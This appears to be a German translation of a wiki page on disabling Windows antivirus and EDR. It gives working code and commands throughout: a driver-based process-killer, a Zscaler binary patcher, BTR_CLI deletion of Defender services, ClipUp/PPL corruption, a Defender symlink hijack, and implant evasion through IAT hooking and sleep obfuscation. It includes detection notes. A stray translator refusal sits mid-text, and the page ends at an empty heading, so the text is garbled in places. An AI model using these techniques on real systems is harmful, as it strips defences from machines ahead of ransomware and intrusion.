Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um den Endpunktschutz zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst AV-Dienste mit Protected-Process-Light (PPL) nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, aber die Binärdatei ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur besitzt, wird er auch bei aktivierter Driver-Signature-Enforcement (DSE) geladen.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **kernel service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL code | Fähigkeit                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Einen beliebigen Prozess anhand seiner PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Eine beliebige Datei auf dem Datenträger löschen |
   | `0x990001D0` | Den Treiber entladen und den Dienst entfernen |

   Minimales C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht den Schutz im User-Mode vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Härtungsfunktionen.

Erkennung / Gegenmaßnahmen
• Aktivieren Sie Microsofts Sperrliste für anfällige Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
• Überwachen Sie das Erstellen neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem world-writable Verzeichnis geladen wird oder nicht auf der Allowlist steht.
• Achten Sie auf Handles im User-Mode zu benutzerdefinierten Geräteobjekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Zscaler-Client-Connector-Posture-Checks durch Patchen von Binärdateien auf dem Datenträger umgehen

Zscalers **Client Connector** wendet Geräte-Posture-Regeln lokal an und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung erfolgt **vollständig clientseitig** (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (mittels `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **Patchen von vier signierten Binärdateien auf dem Datenträger** lassen sich beide Mechanismen neutralisieren:

| Binärdatei | Geänderte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als compliant gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch ein unsignierter) kann sich mit den RPC-Pipes verbinden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Auszug eines minimalen Patchers:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binärdateien können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das durch die Zscaler-Richtlinien definierte interne Netzwerk.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionen von Microsoft Defender `BTR.sys`

Defenders **Boot-Time Removal**-Treiber ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Memory-Corruption-Bug und ohne IOCTL-Schnittstelle. Nachdem ein Operator Administratorzugriff und `SeLoadDriverPrivilege` erlangt hat, kann er stattdessen die private Remediation-Transaktion fälschen und die vorgesehenen Datei-/Registry-Operationen im Ring 0 ausführen. Dies ist ein **Primitive zur Neutralisierung von AV/EDR nach einer Kompromittierung, kein Initialzugriff und keine Rechteausweitung**. Außerdem kann der Treiber aus der `BOOTTIMETOOL`-Ressource der `MpEngine.dll` des Ziels selbst extrahiert werden, statt einen auffälligen Treiber eines Drittanbieters einzubinden.<sup>[[36]](#references)</sup>

### Den One-Shot-Treiber bereitstellen

Defender legt die Ressource normalerweise als Datei mit einem zufälligen Namen im Format `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Dienst. `DriverEntry` liest den `Args`-Wert des Dienstes, öffnet den referenzierten NTFS ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, damit der Treiber entladen wird, statt resident zu bleiben. Ein gefälschter Dienst weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden denselben festen 256-Byte-Schlüssel, daher stellt die Verschlüsselung keine Autorisierungsgrenze dar. Ein gültiger Klartext enthält einen globalen Header mit 24 Byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und eine aus der Payload abgeleitete Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedback-Pfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird separat mit CRC-32 geprüft: Polynom `0xEDB88320`, Anfangszustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`); der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Action-IDs legen diese Kernel-Primitiven offen.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eine Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16 path]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][key path]` | Einen Registrierungsschlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Einen Registrierungswert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Einen Registrierungswert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen zwischen Schlüssel und Wert auf dem Draht **zwei aufeinanderfolgende Backslashes**; ein konventionell formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedback-Datei entspricht größtenteils der Anfrage, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein führendes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten abschließenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Workflow und Early-Boot-Fenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die vollständige Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, mit Prüfsummen versehen und verschlüsseln, den Dienstregistrierungsschlüssel direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber für `-trigger boot` als Systemstarttreiber konfigurieren. Durch die direkte Registrierungseinrichtung wird der normale SCM-Pfad über `CreateServiceW` umgangen; daher wird **kein** Ereignis mit der Service-Install-Ereignis-ID 7045 erzeugt. Mit `BTR_CLI.exe -cleanup <service_name>` lassen sich später durch den Boot-Trigger erzeugte Artefakte entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR Datei-E/A aus `DriverEntry` ausführt, bevor der Storage-Stack und der `SystemRoot`-Link bereit sind. `Start=1` in Verbindung mit der hochpriorisierten Gruppe `Boot Bus Extender` führt stattdessen in Phase 1 zur Ausführung: NTFS ist verfügbar, aber viele sicherheitsrelevante Treiber mit Systemstarttyp und EDR-Dienste im User Mode wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen. BTR kann jedoch ihre Binärdateien oder Dienstkonfiguration vor dem nächsten Start entfernen und Dienstausführungsdateien löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur trägt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt Aktion 1 für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt dieses Protokoll, verarbeitet dann seine eigene Löschanforderung und entfernt es vor dem Entladen. Das reduziert die Spuren. Werden Rückmeldungen in `<random>.sys:<random>.dat` abgelegt, können der Treiber und beide Streams gemeinsam entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

### Korrelationen mit hoher Aussagekraft zur Erkennung

Regeln, die nur Signaturen berücksichtigen, und die Microsoft-Sperrliste für anfällige Treiber verhindern keinen Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzuge die folgenden Verhaltenskorrelationen und unterscheide dabei legitime Defender-Abstammung von einem beliebigen Starterprozess.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist bei der BTR-Bereitstellung immer zu beobachten. Ein `.dat`-ADS, das derselben `.sys`-Datei zugeordnet ist, ist besonders verdächtig, da legitimer Defender Rückmeldungen normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korreliere die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>` mit `Args=...:changelist` und `Group=Boot Bus Extender` mit dem Fehlen eines passenden SCM-Installationsereignisses.
- **Sysmon 6 -> 23:** Korreliere das Laden eines bekannten BTR-Treibers aus einer Nicht-Defender-Abstammung mit anschließenden, `System`/PID 4 zugeordneten Dateilöschungen, insbesondere bei Sicherheitsbinärdateien.
- **Sysmon 11 -> 23:** Melde die schnelle Erstellung und Löschung von `\SystemRoot\Temp\BootClean.log` durch `System`/PID 4.
- Beschränke die Zuweisung und Aktivierung von `SeLoadDriverPrivilege` und prüfe sie. Eine Microsoft-Signatur allein reicht nicht als Vertrauensbeleg aus, wenn ein Treiber eines Sicherheitstools durch `cmd.exe`, PowerShell oder einen unbekannten Prozess bereitgestellt wird.

## Missbrauch von Protected Process Light (PPL) zur Manipulation von AV/EDR mit LOLBINs

Protected Process Light (PPL) erzwingt eine Hierarchie aus Signatur und Schutzstufe, sodass nur gleich oder höher geschützte Prozesse einander manipulieren können. Wenn du offensiv ein PPL-fähiges Binary legitim starten und dessen Argumente kontrollieren kannst, lässt sich harmlose Funktionalität (z. B. Protokollierung) in eine eingeschränkte, durch PPL geschützte Schreibprimitive für geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einer PPL-fähigen EKU signiert sein.
- Der Prozess muss mit `CreateProcess` und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzstufe angefordert werden, die mit dem Signierer des Binary übereinstimmt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signierer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signierer). Bei falschen Stufen schlägt die Erstellung fehl.

Eine umfassendere Einführung in PP/PPL und den LSASS-Schutz findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Tools zum Starten
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzstufe aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Ich kann keine Anleitung übersetzen, die das Umgehen und Beschädigen von Antivirus-Schutz ermöglicht. Ich kann stattdessen eine defensive Zusammenfassung auf Deutsch erstellen.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht steuern, sondern nur dessen Platzierung; diese Primitive eignet sich eher für Beschädigungen als für das präzise Einschleusen von Inhalten.
- Zum Installieren/Starten eines Dienstes und für einen Neustart ist lokaler Administratorzugriff/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Booten vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere mit nicht standardmäßigen Launchern als übergeordneten Prozessen, rund um den Bootvorgang.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und zuverlässig vor Defender/AV gestartet werden. Untersuche die Erstellung/Änderung von Diensten vor Fehlern beim Start von Defender.
- Überwachung der Dateiintegrität von Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, sowie nach anomaler Verwendung von PPL-Stufen durch Nicht-AV-Binärdateien.

Abwehrmaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; blockiere den Aufruf von ClipUp außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke die Erstellung/Änderung von automatisch startenden Diensten und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Manipulationsschutz von Defender und der Early-Launch-Schutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hindeuten.
- Ziehe in Betracht, die Generierung von 8.3-Kurznamen auf Volumes mit Sicherheitstools zu deaktivieren, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Microsoft Defender durch Hijacking von Symlinks zu Plattformversionsordnern manipulieren

Windows Defender wählt die Plattform, von der es ausgeführt wird, indem es Unterordner in folgendem Verzeichnis aufzählt:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der lexikografisch höchsten Versionszeichenfolge aus (z. B. `4.18.25070.5-0`) und startet dann von dort aus die Defender-Dienstprozesse (wobei Dienst-/Registrierungspfade entsprechend aktualisiert werden). Bei dieser Auswahl werden Verzeichniseinträge einschließlich Verzeichnis-Reparse-Points (Symlinks) als vertrauenswürdig behandelt. Ein Administrator kann dies nutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Dienststörung zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks im Platform-Ordner zu erstellen)
- Möglichkeit, einen Neustart durchzuführen oder eine erneute Plattformauswahl durch Defender auszulösen (Dienstneustart beim Booten)
- Nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber bei der Plattformauswahl werden Verzeichniseinträge als vertrauenswürdig behandelt und der lexikografisch höchste Versionsordner ausgewählt, ohne zu prüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle einen beschreibbaren Klon des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Versionsnummer, der auf deinen Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, ob MsMpEng.exe (WinDefend) über den umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry beobachten, die diesen Speicherort widerspiegeln.

Post-Exploitation-Optionen
- DLL-Sideloading/Codeausführung: Legen Sie DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, ab oder ersetzen Sie sie, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Dienst beenden/Denial: Entfernen Sie den Versions-Symlink, damit der konfigurierte Pfad beim nächsten Start nicht mehr aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Privilegieneskalation ermöglicht; sie erfordert Administratorrechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können runtime evasion aus dem C2-Implantat in das Zielmodul verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) umleiten. Dadurch lässt sich die evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz auf BOFs und Post-Exploitation-DLLs ausweiten.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Vorgehensweise auf hoher Ebene
- Ein PIC-Blob wird mithilfe eines Reflective Loaders neben dem Zielmodul bereitgestellt (vorangestellt oder als Begleitdatei). Der PIC muss eigenständig und positionsunabhängig sein.
- Beim Laden der Host-DLL wird ihr IMAGE_IMPORT_DESCRIPTOR durchlaufen und werden die IAT-Einträge gezielter Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so angepasst, dass sie auf schlanke PIC-Wrapper verweisen.
- Jeder PIC-Wrapper führt vor dem Tail-Call an die echte API-Adresse evasions aus. Typische evasions umfassen:
  - Memory mask/unmask rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/Berechtigungen ändern) und anschließend wiederherstellen.
  - Call-Stack Spoofing: Einen unauffälligen Stack erstellen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse die erwarteten Frames auflöst.<sup>[[9]](#references)</sup>
- Für die Kompatibilität wird eine Schnittstelle exportiert, über die ein Aggressor-Skript (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking?
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooken von LoadLibrary* lassen sich Modulladevorgänge abfangen (z. B. System.Management.Automation.dll, clr.dll) und dieselben Maskierungs- und Stack-evasion-Techniken auf deren API-Aufrufe anwenden.
- Ermöglicht wieder die zuverlässige Verwendung von Post-Ex-Befehlen, die Prozesse starten, gegen call-stack-basierte Erkennungen, indem CreateProcessA/W gewrappt wird.

Minimales IAT-Hook-Schema (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr demonstrieren das Hooking während DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gespeichert hast, oder über LdrGetProcedureAddress.
- Verwende für PIC RW → RX-Übergänge und lasse keine Seiten mit Schreib- und Ausführungsrechten zurück.

Stub für Call-Stack-Spoofing
- PIC-Stubs im Draugr-Stil erstellen eine gefälschte Call Chain (mit Rücksprungadressen in unauffällige Module) und wechseln dann zur echten API.
- Damit werden Erkennungen umgangen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwartete Frames zu gelangen.

Operative Integration
- Stelle den Reflective Loader den post-ex-DLLs voran, damit PIC und Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs transparent denselben Evasion-Pfad nutzen, ohne dass Codeänderungen nötig sind.

Überlegungen zu Detection/DFIR
- IAT-Integrität: Einträge, die auf Nicht-Image-Adressen (Heap/anon) verweisen; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Rücksprungadressen, die nicht zu geladenen Images gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: In-Process-Schreibvorgänge in die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden angelegt werden.
- Image-Load-Evasion: Wenn LoadLibrary* gehookt wird, verdächtige Ladevorgänge von Automation-/CLR-Assemblies überwachen, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## Import-Time-IAT-Hooking + Sleep-Obfuscation (Crystal Palace/PICO)

### Import-Time-IAT-Hooks über ein resident PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen eigenen Resolver ersetzt, der zuerst Hooks prüft:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem der transiente Loader-PIC sich selbst freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Imports per Ordinal und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook vorhanden ist, gib ihn zurück; andernfalls leite den Aufruf an den echten `GetProcAddress` weiter.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal-Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er sich im resident PICO befindet.

Das ermöglicht **Import-Time-IAT-Umleitung**, ohne nach dem Laden den Code-Abschnitt der geladenen DLL zu patchen.

### Erzwingen hookbarer Imports, wenn das Ziel PEB-Walking verwendet

Import-Time-Hooks werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs über einen PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der Pfad `ProcessImports()` des Loaders ihn erfasst:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, der die Abfangung ermöglicht, wenn der Reflective Loader Imports auflöst.

### Ekko-ähnliche Sleep-/Idle-Obfuscation ohne Patchen von `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlichen Wait-/IPC-Primitiven**, die das Implantat verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten kannst du den Aufruf in eine Obfuscation-Chain im Ekko-Stil einbetten, die das im Speicher befindliche Image während der Idle-Zeit verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Folge von Callbacks einzuplanen, die `NtContinue` mit präparierten `CONTEXT`-Frames aufrufen.
- Typische Chain (x64): Image auf `PAGE_READWRITE` setzen → RC4-Verschlüsselung mit `advapi32!SystemFunction032` auf das gesamte gemappte Image anwenden → blockierenden Wait ausführen → RC4-Entschlüsselung → **Berechtigungen pro Abschnitt wiederherstellen**, indem die PE-Abschnitte durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert ein `CONTEXT`-Template. Klone es in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Wartezeiten „success“ zurück (z. B. `WAIT_OBJECT_0`), damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Zeitfenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Detection-Ideen (telemetriebasiert)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` verweisen.
- `advapi32!SystemFunction032` wird auf großen zusammenhängenden Puffern in Image-Größe verwendet.
- `VirtualProtect` für große Bereiche, gefolgt von der Wiederherstellung benutzerdefinierter Berechtigungen pro Abschnitt.

### Runtime-CFG-Registrierung für Sleep-Obfuscation-Gadgets

Bei CFG-aktivierten Zielen stürzt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` den Prozess normalerweise mit `STATUS_STACK_BUFFER_OVERRUN` ab, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-ähnliche Chains in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes indirekte Ziel der Chain mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** abdecken.
- Verwende bei manuell gemappten/PIC-/gestompten Regionen stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt aufgerufene Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie alle ausführbaren, vom Angreifer kontrollierten Abschnitte, die zu indirekten Zielen werden.

Damit werden Sleep-Chains im ROP-/JOP-Stil von einer Technik, die „nur in Prozessen ohne CFG funktioniert“, zu einem wiederverwendbaren Primitiv für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

